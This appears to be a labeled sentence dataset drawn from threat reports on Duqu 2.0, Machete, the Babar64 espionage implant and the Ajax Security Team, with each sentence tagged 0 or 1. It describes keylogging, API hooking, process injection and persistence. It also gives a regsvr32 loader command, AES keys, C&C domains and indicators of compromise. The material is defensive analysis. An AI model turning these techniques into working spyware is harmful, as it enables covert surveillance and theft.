Every byte of the IV is generated by XORing the index of the actual byte with a magic constant ( " 0xDEADBABE " and " 0x248561EF " , respectively , in the two cases ) .	0
Byte index starts from zero .	0
As we can see , there are only three small differences between the routines : the magic constants used by the IV generation , the fact that in Duqu the key is a constant global variable with fixed value while in Duqu 2.0 it is an argument of the initialization function , and finally , the possible length of the key .	0
In case of Duqu , the prepare_key function assumes that the key is always 256 bits , while in case of Duqu 2.0 , the prepare_key function takes the key length as an argument .	0
Key length can be 128 , 192 or 256 bits .	0
Under the encryption layer ( which is identical in the new and old samples as described in the previous section ) , the configuration file format of the new Duqu 2.0 samples is very similar to the old Duqu config file format .	0
For an overview , see Figure 5 below .	0
The format is designed to hold key - value pairs .	0
The keys are always 4-byte long , and the values can be of arbitrary size .	0
We believe that the keys are timestamps and the values are configuration entries , although the file format could hold any other similarly structured information ( e.g.	0
configurations ) .	0
The old file format begins with 4 bytes whose value is undefined .	0
In the serialization process , it is read from an uninitialized buffer , and it is ignored in the deserialization process .	0
The new file format does not have such a beginning byte sequence .	0
The main part of the file format is surrounded by 4 signature bytes at the beginning and at the end .	0
The byte sequence in the old Duqu file format is 0x839172FF , and in the new Duqu 2.0 version , it is 0x7749CB4D.	0
In both cases , the next integer indicates the number of entries , followed by the entries themselves .	0
Each entry begins with a 4-byte key , and then the value .	0
In the new format , the value always begins with 13 bytes ( that can be logically divided into four 4 byte integers and a 1 byte value : 4 + 4 + 1 + 4 + 4 ) , but in the old format , this is missing .	0
Furthermore , the value contains a variable size part in both formats .	0
This is a length prefixed buffer that can hold arbitrary data .	0
In essence , the only difference between the Duqu and the Duqu 2.0 config file formats is the presence of the undefined 4 bytes at the beginning of the file in the old version , and the presence of the 13 additional value bytes in the new version .	0
We 've identified a characteristic logging function that is present in both Duqu and Duqu 2.0 , and is used extensively in the networking ( mainly HTTP handling ) part of the code .	1
The logging function itself is identical , and the data structure used for storing log entries is very similar .	0
The Duqu version of the data structure has embedded function pointers , while the Duqu 2.0 version uses a virtual function table like structure .	0
The main difference from a C++ virtual function table is that the pointer to the table is the last field of the associated structure instead of the first field ( see Figure 6 ) .	0
In general , change in the coding style can be seen all over the code .	0
While Duqu uses object oriented style that is similar , but not identical to what C++ compilers do , Duqu 2.0 moved mainly to " real " C++ , but there are still deviations from the standard C++ style ( like the previously function table ) .	0
Both the Duqu and Duqu 2.0 avoids storing the messages logged through this function .	0
In both codebase , a " handle_log_entry " function is called after creating the log entry structure , but this function throws the object away ( frees the memory ) and does not print or save it .	0
The authors probably used C / C++ macros to avoid detailed logging in release builds , but in this case we still see the logging function invocation .	0
In this case , the macro was probably placed in the function that should have printed the log message ( handle_log_entry ) , and since this is a virtual function , the compiler could not optimize out the function invocations directly .	0
The logging function is called equal times in the Duqu and the Duqu 2.0 samples , and the invocation is always very similar ( see Figure 7 ) .	0
The arguments are usually not strings describing the event directly , but 4 byte magic numbers .	0
The logging function is invoked equal times , and the magic numbers are almost always identical in Duqu and Duqu 2.0 .	0
The network communication methods used by Duqu 2.0 are described in the following list .	0
SocketServer1 .	0
In export function nr1 , if in the config the " startSockServer " parameter is set , it will start a server accordingly SocketServer2 .	0
Binds between ports 17000 and 17100 , can be configured to be client or server GifServer .	0
With Custom HTTP Server implementation , possibly based on SocketServer2 PipeComm .	0
PIPE or IPC communication , customizable network communication HttpClient .	0
WinHTTP - based , simple client , uses " COUNTRY= " in cookie parameters , ( standard HTTP client ) Duqu has used a very unique user agent string when communicating over HTTP .	0
Mozilla/5.0 ( Windows ; U ; Windows NT 6.0 ; en - US ; rv:1.9.2.9 ) In contrast , Duqu 2.0 chooses user agent string randomly from a large set of often used values listed in Sample 7 .	0
The following list shows the browser agent strings found in Duqu 2.0 .	0
Duqu 2.0 uses more than one method to import functions from DLLs .	0
One of the methods utilizes a hash method to represent function names as 4 byte integers .	0
It iterates through all importable function and finds the one whose function name hash matches the given hash .	0
This hash function uses a magic number .	0
A very similar import method and hash function is used in Duqu and Duqu 2.0 although the magic numbers are different : 0x86F186F1 and 0xB31FB31F.	0
Note that even the inner structure of the magic numbers are similar ( 2x2 bytes ) .	0
The malware can transmit information through HTTP traffic .	1
It is most likely that one or more infected computers can be proxy points towards the attacker , meaning that other infected computers communicate with these proxies .	1
These proxies can act as HTTP or HTTPS servers .	1
For HTTPS , a self signed certificate is created by the malware itself .	0
( Most likely by contacting gpl3.selfsigned.org ) .	0
The Common Name ( CN ) field seems to be " * " in the created certificate .	0
During data transfer , the malware uses < 5 random numbers>.gif for file name and a 843-byte GIF file + additional random bytes .	0
The transmissions may be protected by AES .	0
One possible way to detect such transmission ( if cleartext traffic is somehow available ) to detect the actual 843-byte GIF file .	0
For the known two samples , this GIF portion was identical .	0
The actual image in hex dump is the following .	0
The image itself is a small picture , basic color is yellow and there are some orange dots in it .	0
For the main binary of the malware , we propose the following rules for detection .	0
We 've made an initial analysis to prove our claims that there is a strong connection between Duqu and Duqu 2.0 malwares .	0
Our main goal was to highlight the most striking similarities and differences between the samples .	0
Similarities shows that the developers of Duqu 2.0 have reused the code basis of the old Duqu specimens and the differences found in the binaries indicates that the developers of Duqu have modified their tools to avoid detections .	0
[ CrySySDuqu ] CrySyS , Duqu : A Stuxnet - like malware found in the wild , v0.93 ( 14/Oct/2011 ) http://www.crysys.hu/publications/files/bencsathPBF11duqu.pdf [ SymantecDuqu ] Symantec , W32.Duqu : The precursor to the next Stuxnet , Version 1.4 ( November 23 , 2011 ) http://www.symantec.com/content/en/us/enterprise/media/security_response/white papers / w32_duqu_the_precursor_to_the_next_stuxnet.pdf [ KasperskyDuqu ] Kaspersky Lab , Duqu : Steal Everything , Kaspersky Lab 's investigation - " The Mystery of Duqu " in blogs http://www.kaspersky.com/about/press/major_malware_outbreaks/duqu [ SymantecDossier ] Symantec , W32.Stuxnet Dossier , Version 1.4 ( February 2011 ) http://www.symantec.com/content/en/us/enterprise/media/security_response/white papers / w32_stuxnet_dossier.pdf [ KasperskyDuqu2.0 ] Kaspersky Lab , The Duqu 2.0 : Technical Details , Version : 1.9.8 ( 2.June.2015 ) https://securelist.com / blog / research/70504/the - mystery - of - duqu-2 - 0-a - sophisticated- cyberespionage - actor - returns/ Questions and comments are welcome .	0
The corresponding author is Dr.	0
Boldizs r Bencs th bencsath@crysys.hu Laboratory of Cryptography and System Security CrySyS – http://www.crysys.hu/ Budapest University of Technology and Economics Department of Telecommunications 1117 Magyar Tud sok Krt .	0
2 .	0
Budapest , Hungary GPG BENCSATH Boldizsar < boldi@crysys.hu > Key ID 0x64CF6EFB Fingerprint 286C A586 6311 36B3 2F94 B905 AFB7 C688 64CF 6EFB	0
Some time ago , a Kaspersky Lab customer in Latin America contacted us to say he had visited China and suspected his machine was infected with an unknown , undetected malware .	0
While assisting the customer , we found a very interesting file in the system that is completely unrelated to China and contained no Chinese coding traces .	0
At first look , it pretends to be a Java related application but after a quick analysis , it was obvious this was something more than just a simple Java file .	0
It was a targeted attack we are calling " Machete " .	0
" Machete " is a targeted attack campaign with Spanish speaking roots .	0
We believe this campaign started in 2010 and was renewed with an improved infrastructure in 2012 .	0
The operation may be still " active " .	0
The malware is capable of the following cyber - espionage operations .	1
Most of the victims are located in , Venezuela , Ecuador , Colombia , Peru , Russia , Cuba , and Spain , among others .	0
In some cases , such as Russia , the target appears to be an embassy from one of the countries of this list .	0
Targets include high - level profiles , including intelligence services , military , embassies and government institutions .	0
The malware is distributed via social engineering techniques , which includes spear - phishing emails and infections via Web by a fake Blog website .	1
We have found no evidence of of exploits targeting zero - day vulnerabilities .	0
Both the attackers and the victims appear to be Spanish - speaking .	0
During this investigation , we also discovered many other the files installing this cyber - espionage tool in what appears to be a dedicated a spear phishing campaign .	1
These files display a PowerPoint presentation that installs the malware on the target system once the file is opened .	0
These are the names of the PowerPoint attachments .	0
These files are in reality Nullsoft Installer self - extracting archives and have compilation dates going back to 2008 .	0
A consequence of the embedded Python code inside the executables is that these installers include all the necessary Python libraries as well as the PowerPoint file shown to the victim during the installation .	0
The result is extremely large files , over 3 MB .	0
Here are some screnshots of the mentioned files .	0
A technical relevant fact about this campaign is the use of Python embedded into Windows executables of the malware .	0
This is very unusual and does not have any advantage for the attackers except ease of coding .	0
There is no multi - platform support as the code is heavily Windows - oriented ( use of libraries ) .	0
However , we discovered several clues that the attackers prepared the infrastructure for Mac OS X and Unix victims as well .	0
In addition to Windows components , we also found a mobile ( Android ) component .	0
Both attackers and victims speak Spanish natively , as we see it consistently in the source code of the client side and in the Python code .	0
The following code snippets were found into the HTML of websites used to infect victims .	0
Note : Thanks to Tyler Hudak from Korelogic who noticed that the above HTML is copy pasted from SET , The Social Engineering Toolkit .	0
Also the following link to one known infection artifact .	0
hxxp://name.domain.org / nickname / set / Signed_Update.jar The following are domains found during the infection campaign .	0
Any communication with them must be considered extremely suspicious Creates the file Java Update.lnk pointing to appdata / Jre6/java.exe Malware is installed in appdata/ MicroDes/ Running processes Creates Task Microsoft_up The first evidence is the language used , both for the victims and attackers , is Spanish .	0
The victims are all Spanish speaking according to the filenames of the stolen documents .	0
The language is also Spanish for the operators of the campaign , we can find all the server side code written in this language : reportes , ingresar , peso , etc .	0
The " Machete " discovery shows there are many regional players in the world of targeted attacks .	0
Unfortunately , such attacks became a part of the cyber arsenal of many nations located over the world .	0
We can be sure there are other parallel targeted attacks running now in Latin America and other regions .	0
Kaspersky Lab products detect malicious samples related to this targeted attack as Trojan- Spy . Python . Ragua .	0
Note : A full analysis of the Machete attacks is available to the Kaspersky Intelligent Services customers .	0
Contact : intelreports@kaspersky.com	0
DROPPER MD5 9fff114f15b86896d8d4978c0ad2813d SHA-1 27a0a98053f3eed82a51cdefbdfec7bb948e1f36 File Size 693.4 KB ( 710075 bytes ) Compile Time 2011 - 08 - 29 11:48:42 IMPLANT MD5 4525141d9e6e7b5a7f4e8c3db3f0c24c SHA-1 efbe18eb8a66e4b6289a5c53f22254f76e3a29bd File Size 585.4 KB ( 599438 bytes ) Compile Time 2011 - 08 - 29 13:02:29 Special thanks for their contribution in the making of this report go to Morgan Marquis - Boire , Joan Calvet , Paul Rascagn res , Alex Dulaunoy , Raphael Vinot and the remaining team of CIRCL Luxembourg .	0
You guys rock \m/ Comments or inquiries please direct to Marion Marschalek ( 0xF372F2CA ) .	0
Babar and the related crowd of animalesque malware will be presented at SyScan'15 conference ( https://www.syscan.org/ ) in March 2015 .	0
No elephants were harmed in the making of this report .	0
This work is licensed under a Creative Commons Attribution - NonCommercial - ShareAlike 4.0 International License .	0
Subject of this analysis is a fascinating piece of malware , which invades Windows desktop machines and aims at ..	0
well , all the things .	0
The analyzed malware consists of a dropper and an implant , which invades Windows processes to steal data from instant messengers , softphones , browsers and office applications .	1
A fully blown espionage kit , so to say , sophisticated almost .	0
The implant is able to hook APIs of interest in dedicated remote processes , to steal data on the fly .	1
More interesting than the malware itself though is the path to the associated symbol file , which appears embedded in the dropper .	0
The analyzed malware samples come with the internal project name ' Babar64 ' .	0
The myth of Babar has been around for a while in the intelligence community .	0
Questions have been raised since Le Monde published an article on Babar in 2014 [ 1 ] and were recently fuelled by a leaked government presentation found among a stash of documents published in January by Spiegel [ 2 ] .	0
The leaked document was authored by the Communications Security Establishment Canada ( CSEC ) and reports about a potential nation state attack involving malware named Babar .	0
The actor behind the attacks is assumed to be French inteligence .	0
Assumptions are based on certain binary attributes , language and location of infrastructure as well as targets .	0
The binaries at hand fit well with the description CSEC provides , although it is quite clear they are a newer version from what CSEC had uncovered around 2009 .	0
It is not clear whether the compilation timestamps are falsified , but an earlier compilation time than the actual stamp seems unlikely .	0
Doubtlessly though , the Babar binaries match with a malware strain representing itself as Bunny , as well as a family dubbed NBOT or TFC .	0
The dropper operates straight forward ; it fetches the encrypted DLL from its own binary from outside its resource section , decrypts it and hides it in the file system .	1
Then it goes on to load the DLL using Windows regsvr32.exe .	1
To achieve this it spawns a dedicated process with the command line ' " regsvr32.exe " /s /n /i " % APPDATA%\%DLLNAME% " ' .	1
The DLL name is random but legitimately looking and hardcoded for a specific dropper .	0
It is also stored as encrypted string in the binary , and has been seen to decrypt to either ' perf585.dll ' or ' dump21cb.dll ' depending on the dropper .	0
The encryption algorithm used is AES ( Advanced Encryption Standard ) with 128-bit keys .	0
The keys used for decryption are ' 20 33 AF 73 A9 AC 72 D3 BE E6 A5 73 92 BA 37 6C ' for the implant filename and ' A0 0E 3E B3 3A 1C D3 AA A0 BE 3F B3 F9 0A 96 15 ' for decrypting the binary .	0
AES is the encryption algorithm of choice throughout the dropper and its implant 's operations .	0
Interestingly , the Babar dropper as well as the implant show a similar method of API name obfuscation as the Bunny malware and samples from the NBOT family .	0
Dedicated APIs are loaded through a resolution function , which searches for library exports by comparing hashes of the export names with a given hash .	0
For the Babar project though the attackers used an adapted version of SHA-1 , as opposed to the simple XOR / ROL hash algorithm which was used in the Bunny project .	0
After infection the dropper executes a separate command line through spawning a cmd.exe process , which is instructed to wait for 1 second before deleting the dropper binary on disk .	1
This way the malware reduces forensic artefacts , staying behind after infection .	1
Curiously though , the regsvr32.exe process used to load the dropped implant remains running .	0
This way Babar leaves a visible process on the process list during execution .	0
As the project name ' Babar64 ' suggests , dropper and implant are designed to work on 32-bit and on 64-bit Windows versions .	0
However , process hooking and injection can only affect 32-bit processes due to the bitness of the implant itself .	0
Babar 's implant is a 32-bit DLL written in C++ , which upon start injects itself to running processes and invades desktop applications by applying a global Windows hooks .	1
The implant is capable of logging keystrokes , capture screen shots , spy on installed softphones and instant messengers next to a list of simpler espionage tricks .	1
Babar is a fully blown espionage tool , built to excessively spy on the user 's activity on an infected machine .	0
The DLL dropped by Babar is placed into the application data folder , along with a directory named ' MSI ' where the runtime data will be stored .	0
Babar operates through multiple instances , by injecting its DLL to a maximum of three desktop processes .	1
This is achieved by loading the Babar DLL to remote processes through a mapped memory object .	0
Apart from that , Babar comes with a userland rootkit component which applies global Windows hooks to invade all processes on its desktop .	1
This way Babar can install API hooks for various APIs via Windows Detours technique to actively steal data from arbitrary processes .	1
Babar 's anti - analysis measures are sparse .	0
It is not protected by a runtime packer or crypter , it does not have sandbox detection or anti - debugging measures , most character strings are shown in clear - text .	0
Babar does show the same obscure treatment for installed anti - virus products as the Bunny malware though .	0
Babar also enumerates the Windows Management Instrumentation for installed AV solutions , while the exact use of this information is not yet known .	0
We do suspect large portions of the product enumeration to be based on the exact same source code as the module Bunny used .	0
The enumeration function issues the commands „ SELECT * FROM AntiVirusProduct " and retrieves attributes such as ' productState ' , ' DisplayName ' , ' VersionNumber ' and ' productUptoDate ' .	0
The anti - virus solutions searched for are again identified by 256-bit SHA hashes .	0
Only some of the hashes could be mapped to known names of anti - virus solutions .	0
Babar also implements an obfuscation technique to hide certain API names .	1
Selected APIs are identified by hashes , which are used to load the APIs dynamically at runtime .	0
The hashes are hardcoded within the binary , and will be compared to hashed library exports by the API resolution routine .	0
The hashing algorithm is different from the simple XOR / ROL technique Bunny uses .	0
It seems to be based on SHA-1 , but generates 32-bit hashes instead of the standard 160-bit length .	0
What Bunny , Babar and NBOT all have in common though is that the obfuscation technique is easy to break and only applied to a subset of APIs .	0
As an anti - analysis trick this is considerably useless , it does make sense though to trick malware detection solutions which apply heuristics based on static analysis of API calls .	0
This becomes evident when looking at the list of Babar 's obfuscated API names , which includes RegisterRawInputDevices , GetRawInputData , GetClipboardData or DirectSoundCaptureCreate .	0
The startup routine of the Babar implant will create a registry key under ' [ HKU]\ .. \CurrentVersion\Run ' to assure persistence .	1
The key is named ' MSSecurity ' and executes the exact same command line as the infector , every time the system boots - ' " regsvr32.exe " /s /n /i " % APPDATA%\%DLLNAME% " ' .	0
At system boot time the regsvr32.exe process will start , load the Babar DLL and thus ' deploy ' the malware to various legitimate processes .	1
As opposed to persistence , Babar also implements functionality to uninstall itself from the affected system .	1
Interesting again , same as during infection , the regsvr32.exe process remains running even after Babar is readily set up .	0
During initialization Babar loads and decrypts a set of configuration parameters which are appended to the DLL 's relocation section .	0
ASCII strings within the configuration data reveal a lot about Babar 's intentions .	0
As could be seen already in binaries of related families , next to the hardcoded configuration data Babar maintains a system specific runtime configuration .	0
The additional configuration consists of a set of local attributes and a set of values derived from the Windows environment .	0
The attributes are dynamically generated or requested at runtime and not stored in memory .	0
Values retrieved from Windows environment .	0
The DLL when loaded in the context of an application seeks to invade a maximum of two more victim processes .	0
This for once is a resilience measure , so if the initially infected process stops running the malware remains in memory through additional instances .	0
On the other hand it is practically a load balancing measure .	0
The C&C communication module is located in an export of the DLL , which will be executed through a remote thread , injected like the child processes , via a memory - mapped file .	0
The process infection is achieved by mapping a shared object into the victim 's process space and invoking a function stub as remote thread .	0
The steps being taken are .	0
The function stub will then go on to load the Babar DLL through LoadLibraryA and execute one of its exports , as indicated in the shared memory .	1
The mapped object contains name and path to the malicious DLL , the name of the pipe being used for communication between the instances , the name of the export from the DLL to be called as well as information about instances already running .	0
For picking a process to infect the malware randomly picks one from a list of prospects .	0
These have to be 32-bit processes , not already infected and not among a list of processes to avoid such as winlogon.exe , explorer.exe , cmd.exe or regsvr32.exe .	0
This way Babar always keeps three instances in memory .	0
The first one to start up will be the ' main instance ' .	0
If any of the instances dies , a new third instance will be created .	0
If the main instance dies the oldest child will take over .	0
For inter process communication Babar uses named pipes .	1
The main instance generates a random GUID which is used as name and passed to child instances .	0
At the same time , the main instance creates six named pipes using the very same GUID .	1
These pipes represent the server side for child instances , and also the point to connect to for hooks Babar installs to spy on several system APIs .	0
The spying activities are performed either through the Babar instance locally or via a global Windows hook invading all processes running in the same desktop .	1
Instance - local capabilities are basic spying on window names or snooping on the clipboard data , while the global hooks manage to steal information directly from Windows API calls .	1
A summary of the capabilities would be as follows .	0
The keylogger is based on the raw input model .	0
The malware creates an invisible window , with no other purpose than to receive window messages .	1
By processing the window message queue it filters out input events and dispatches them to a raw input device object .	0
Said object is configured to grab keyboard events through GetRawInputData .	0
The snooped keystroke data is passed to a thread , which performs encryption and dumps the data to a log file .	1
The file is located in Babar 's working directory and named update.msi .	0
The design of the keylogging component is simple but effective .	0
Babar is able to sniff all keystrokes happening on the same desktop as its invisible window .	1
Interesting though , the code seen in Babar 's implant is remarkably similar to an example posted at [ 4 ] .	0
The Babar implant applies global Windows hooks to load its DLL into the process space of other processes .	1
A global hook is installed by calling SetWindowsHookEx by passing the thread ID zero .	0
It applies to all processes running in the same desktop , having the same ' bitness ' as the DLL to be injected .	0
In the given case this applies to all 32-bit processes .	0
A global Windows hook is installed into the Windows event chain .	1
This effectively means code provided by the hooking DLL gets executed whenever an arbitrary desktop process receives an event of a type specified by the hook .	0
Babar installs hooks for type 2 and 3 , which are WH_KEYBOARD and WH_GETMESSAGE .	0
This way Babar has control over all keyboard and message events received by any application on the same Windows desktop .	0
Through the hook mechanism Babar can be maximum invasive in the Windows userland .	0
Once in the context of a desired target process , the malware goes on to hook specific APIs of interest .	1
This is achieved by applying the detours technique , which implements trampoline functions to be invoked every time a hooked API is called [ 6 ] .	0
To achieve this , Babar rewrites the in - memory code for target APIs .	0
A call to a hooked API then results in the calling application invoking a trampoline function , which performs malicious activity and then passes control on to the legitimate API .	0
Babar supports trampoline functions for a limited list of APIs and limited to a set of processes of interest , defined by its configuration .	0
The list of APIs to hook is parted in three groups .	0
Any set of hooks will only be applied to a defined set of processes .	0
The predefined groups of application names retrieved from the hardcoded configuration data set the scope of Babar 's hooking advances .	0
The respective trampolines steal data going in or out of the hooked APIs on the fly .	1
The parsing function for intercepted internet communication searches for chat traffic , more specifically for messages conforming with the MSNP21 standard .	0
Babar is searching for tags such as ' Message- Type ' , ' Reliability ' , ' To ' , ' From ' or ' Text ' to pick out of the stream .	0
A more detailed explanation concerning the MSNP21 can be found at [ 7 ] .	0
MSNP21 is the MSN messenger chat protocol that was introduced with Windows Live 2010 beta .	0
It is unclear though as of why only parsing for the MSN messenger is supported .	0
The data , like all stolen information , is handled by a separate thread which compresses and encrypts it before dumping it to a file on disk .	1
For grabbing audio streams Babar includes code from the OpenCORE AMR library [ 8 ] .	1
AMR enables the malware to encode and decode raw audio frames as they are passed to or grabbed from the audio devices .	0
The very same malware module performs screen captures while dumping the snooped data .	0
This is assumed to happen to recognize the parties involved in the conversation by capturing the GUI of the softphone application .	0
Babar comes with the Deflate algorithm , as used by Zlib , to be able to compress data before encrypting it and dumping it to disk .	0
The data is encrypted with 128-bit AES using the key 24 FE C5 AD 34 56 F7 F8 12 01 00 AE B6 7C DE AB for reading and writing files .	0
The following files have been seen to be dumped to Babar 's working directory under % APPDATA%\MSI .	0
Stolen information will be handled by the Babar main instance , which receives data through six named pipes from other instances or hooked processes .	0
The update.msi-file stores data collected by the keylogging module .	0
It posesses a file header which among other attributes keeps system specific data .	0
This is assumed to serve for mapping of logfiles to infected hosts .	0
Log lines written for stolen data from browsers and the MSN messenger are built by the format string " % s%c%s|%s\n " , where the first string is likely participant1 of a conversation , the second string participant2 .	0
Both are parted by the characters ' < ' or ' > ' depending on the direction of the conversation .	0
Similar log lines accompany dumped sound data and saved documents .	0
Sound data logs follow the format " A|%u|%S " , document logs the format " % I64i|%I64i|%I64i|%s%s|%s\n " .	0
For documents three timestamps are included as well as whether read or write access was requested , indicated by ' R ' or ' W ' or ' - ' .	0
The last placeholder is reserved for the filename .	0
At the time of writing the content of the sound data log line remains unclear .	0
The internet communication module of Babar is located in a sparate export called ' FindCtxSectionStringW ' , which will be invoked through remote thread injection at runtime .	0
Injection is achieved the same way as the infection of child instances described in section 3.4 .	0
The analyzed sample of Babar has two hard coded C&C server addresses which are included in its configuration data .	1
Both servers were used to push spied information onto the remote site .	1
It remains unclear though whether the C&Cs also served to instruct the infected machines per commands , as Babar does not posess obvious command parsing functionality .	0
Data exfiltration is assumed to be time triggered .	0
The domain horizons-tourisme.com is a legitimate website , operated by an Algerian travel agency , located in Algiers , Algeria .	0
The website is in French and still online today .	0
Gezelimmi.com is a Turkish domain , currently responding with an HTTP error message 403 , access not permitted .	0
Both domains appear to be of legitimate use , but compromised and abused to host Babar 's server side infrastructure .	0
At the time of writing the server pointed to by horizons-tourisme.com is still hosting left overs from the C&C infrastructure used by Babar .	0
With directory traversal activated researchers from ESET could pull a minimalistic directory structure , showing directories named as follows .	0
page | 14 Obviously , the directory belonging to Babar is ' bb28 ' .	0
' tfc422 ' matches with strings found in the TFC bots ( previously named NBOT ) .	0
The purpose of the ' d13 ' directory remains unknown , although it is assumed to serve for requests of a third currently unknown family .	0
Most of the directories pulled from horizons-tourisme.com are empty , or contain empty files .	0
The only script inside the bb28 directory though appears to be interesting .	0
Its a .php - script named config.inc , containing variables which look familiar from Babar 's config such as ' user ' , ' i d ' or ' seq ' , but also a handful of comments from the authors .	0
At the time of writing two Babar64 droppers are known , dropping one implant each .	0
They both show traits of the malware described by CSEC , being attributed to French intelligence with „ moderate certainty " [ 2 ] .	0
The CSEC document mentions uncovering the attack in 2009 .	0
The compilation timestamps of the binaries date back to August 2011 .	0
While these can be faked it is still unlikely that the authors would change the 2009-timestamp to a future date .	0
This , and the mentioning of ' Babar ' instead of ' Babar64 ' by CSEC indicates that the samples at hand stem from a more recent campaign .	0
Besides the project name , Babar64 also shares the malformed user agent string described in the document , where a letter from the MSIE 6.0 name is missing .	0
The second Babar64 binary comes with its own set of C&C servers .	0
The first one is the legitimate website of AlexPetro Technical Services , a company operating in the oil and gas industry in Kairo , Egypt .	0
The second domain is Iranian , allegedly owned by a web design company named Radcom .	0
What links Babar64 to other families analyzed beforehand , such as Bunny or TFC ( also called NBOT ) are shared portions of source code and re - used coding techniques .	0
The enumeration of anti - virus software and the code to query the system 's proxy settings are almost identical .	0
Furthermore , the samples at hand show the same partial API name obfuscation as Bunny and TFC .	0
What has changed is the hashing algorithm .	0
Also common among all of the families seems to be to hold system specific configuration data in memory at runtime , although this holds true for a lot of malware .	0
Putting Babar , Bunny and TFC in context a number of conclusion can be drawn .	0
Looking at the compilation timestamps and assuming they are not faked ( which is backed by VirusTotal submission dates ) , the oldest family is TFC being active throughout 2010 .	0
These are DDoS bots , used to build a botnet which can be utilized to attack adversaries on the internet .	0
Next on the timeline is Babar64 , allegedly compiled middle of 2011 and first seen on VirusTotal middle of 2012 .	0
It is believed that this strain has been active from 2011 until 2013 , spying on dedicated targets rather than being spread widely .	0
Last comes Bunny , compiled second half of 2011 and making its first public appearance during the analysis of the Adobe Reader exploit for CVE-2011 - 4369 [ 9 ] .	0
At the time when Bunny was spread through CVE-2011 - 4369 , before December 2011 , the vulnerability was unknown to the public .	0
Bunny itself is a Lua script execution platform , not including any spying capabilities .	0
All three families leave the impression of being developed by a team of skilled software developers , rather than being the product of a malware author operating in the criminal underground .	0
Also none of the binaries makes attempts of hiding its intentions , which is a common trait among targeted malware .	0
Heavy obfuscation or the use of crypters easily raises suspicion of heuristics based malware scanners .	0
However , besides the CSEC document there was no obvious pointer found leading to the conclusion that Babar and its companions were set out by French inteligence services .	0
As it is with digital crime , chances are high no proof will ever evolve and research will be limited to educated conclusions .	0
The drawing of personal educated conclusions is left as an exercise for the interested reader .	0
Lists of passive DNS entries for horizons-tourisme.com and gezelimmi.com can be found below .	0
For gezelimmi.com .	0
For horizons-tourisme.com .	0
Resolve Location Network First Last 192.185.113.148 US 192.185.64.0/18 28.04.11 00:00 10.02.15 00:00 184.172.143.188 US 184.172.128.0/18 23.12.06 00:00 28.04.11 00:00 212.27.35.109 FR 212.27.32.0/19 02.08.05 00:00 23.12.06 00:00 206.41.94.190 CA 206.41.94.0/24 24.06.05 00:00 02.08.05 00:00	0
We believe we 're seeing an evolution and development in Iranian-based cyber activity .	0
In years past , Iranian actors primarily committed politically-motivated website defacement and DDoS attacks .	1
More recently , however , suspected Iranian actors have destroyed data on thousands of computers with the Shamoon virus , and they have penetrated the Navy Marine Corps Intranet ( NMCI ) , which is used by the U.S. Navy worldwide .	1
In this report , we document the activities of the Ajax Security Team , a hacking group believed to be operating from Iran .	0
Members of this group have accounts on popular Iranian hacker forums such as ashiyane [ .	0
] org and shabgard [ .	0
] org , and they have engaged in website defacements under the group name '' AjaxTM '' since 2010 .	0
By 2014 , the Ajax Security Team had transitioned from performing defacements ( their last defacement was in December 2013 ) to malware-based espionage , using a methodology consistent with other advanced persistent threat actors in this region .	0
It is unclear if the Ajax Security Team operates in isolation or if they are a part of a larger coordinated effort .	0
The Ajax Security Team itself uses malware tools that do not appear to be publicly available .	0
We have seen this group leverage varied social engineering tactics as a means to lure their targets into infecting themselves with malware .	1
Although we have not observed the use of exploits as a means to infect victims , members of the Ajax Security Team have previously used publicly available exploit code in web site defacement operations .	0
In sum , FireEye has recently observed the Ajax Security Team conducting multiple cyber espionage operations against companies in the defense industrial base ( DIB ) within the Unites States , as well as targeting local Iranian users of anti-censorship technologies that bypass Iran 's Internet filtering system .	0
The transition from patriotic hacking to cyber espionage is not an uncommon phenomenon .	0
It typically follows an increasing politicization within the hacking community , particularly around geopolitical events .	0
This is followed by increasing links between the hacking community and the state , particularly military and/or intelligence organizations .	0
In the late 1990 's and early 2000 's , a similar transition occurred within the Chinese hacking community .	0
During that time period , the Chinese hacking community engaged in website defacements and denial of service attacks in conjunction with incidents such as the accidental bombing of the Chinese embassy in Belgrade in 1999 , the collision of a U.S. spy plane and a Chinese military plane in 2001 , and the Japanese Prime Minister 's controversial visit to the Yasukuni shrine in 2005 .	1
Around this time a significant shift in philosophy began to take place .	0
Members of the Chinese hacking community that participated in such attacks soon found that transitioning to cyber espionage was more rewarding-both in terms of developing a more advanced skill set as well as in monetary remuneration .	0
One group known as NCPH ( Network Crack Program Hacker ) , whose founding member '' Wicked/Withered Rose '' was a patriotic hacker , made the transition to cyber espionage by founding a '' hacker-for-hire '' group that simultaneously developed an association with the Chinese military .	0
The group began developing zero-day exploits , rootkits and remote access tools ( RATs ) -using them in attacks against a variety of targets including the U.S. Department of Defense .	0
( One of this group 's associates , '' whg '' , is still active and is believed to have developed one variant of the PlugX/SOGU malware .	0
) The rationale behind this transition within the Chinese hacking community is nicely summed up in a message by the '' Honker Union of China '' to its members in 2010 : What benefit can hacking a Web page bring our country and the people ? It is only a form of emotional catharsis , please do not launch any pointless attacks , the real attack is to fatally damage their network or gain access to their sensitive information .	0
In Iran , the hacking community appears to be undergoing a similar transformation .	0
While a variety of Iranian hacker groups had engaged in politically motivated website defacements , the emergence of the '' Iranian Cyber Army '' in 2009 demonstrated '' a concentrated effort to promote the Iranian government 's political narrative online '' .	0
They targeted , among others , news organizations , opposition websites and social media .	0
This marked the beginning of a large- scale cyber offensive against the perceived enemies of the Iranian government .	0
Foreign news and opposition websites are routinely blocked in Iran , as are the tools that allow users in Iran to bypass these restrictions .	0
One of the key stakeholders in Iran 's Internet censorship program is the Iranian Revolutionary Guard Corps ( IRGC ) , under which the Basij paramilitary organization operates .	0
The Basij formed the Basij Cyber Council and actively recruits hackers in order to develop both defensive and offensive cyber capabilities .	0
There is increasing evidence to suggest that the hacker community in Iran is engaged in a transition from politically motivated defacements and denial of service attacks to cyber espionage activities .	0
This model is consistent with the Basij 's recruitment of paramilitary volunteer hackers to '' engage in less complex hacking or infiltration operations '' leaving the more technical operations to entities over which they have increasingly direct control .	0
As such , the capabilities of threat actors operating from Iran have traditionally been considered limited .	0
However , the '' Shamoon '' attacks , which wiped computers in Saudi Arabia and Qatar , indicate an improvement in capabilities .	1
And unsurprisingly , Iran has reportedly increased its efforts to improve offensive capabilities after being targeted by Stuxnet and Flame .	0
We have observed the Ajax Security Team use a variety of vectors to lure targets into installing malicious software and/or revealing login credentials .	1
These attack vectors include sending email , private messages via social media , fake login pages , and the propagation of anti-censorship software that has been infected with malware .	1
During our investigation , we discovered that these attackers sent targeted emails , as well as private messages through social media .	1
For example , the attackers targeted companies in the DIB using a fake conference page as a lure to trick targets into installing malicious software .	1
